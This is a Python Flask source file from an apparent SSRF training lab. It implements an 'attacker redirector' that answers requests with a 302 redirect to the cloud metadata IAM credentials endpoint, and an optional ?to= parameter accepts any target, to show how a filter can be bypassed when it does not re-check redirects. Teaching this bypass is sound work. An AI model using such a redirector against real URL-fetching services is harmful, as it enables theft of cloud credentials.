"""
SSRF Lab — Attacker Redirector (lab component)
==============================================
⚠️  LAB-ONLY.  Simulates an attacker-controlled host that looks innocent but
302-redirects to the internal metadata endpoint.

In the real world this would be a domain the attacker owns (e.g. a link they
submit to a "URL preview" feature). Here it is a clearly-labelled lab container
reachable inside the Docker network as `preview-service.lab`.

Purpose: demonstrate the L2 bypass. A filter that validates only the URL *as
submitted* sees an innocent host and allows it — then `requests` follows the
302 to the blocked internal target, which the filter never re-checks. This is
the "check-vs-use" (TOCTOU) / parse-vs-fetch discrepancy.
"""
import os

from flask import Flask, redirect, request

app = Flask(__name__)

# Default victim destination: the fake IAM credentials endpoint.
DEFAULT_TARGET = os.environ.get(
    "REDIRECT_TARGET",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-ec2-demo-role",
)


@app.route("/")
def root():
    # Optional ?to=... lets a demo point the redirect anywhere; by default it
    # sends the follower straight to the internal metadata credentials.
    target = request.args.get("to", DEFAULT_TARGET)
    return redirect(target, code=302)


@app.route("/health")
def health():
    return "redirector ok\n"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=False)
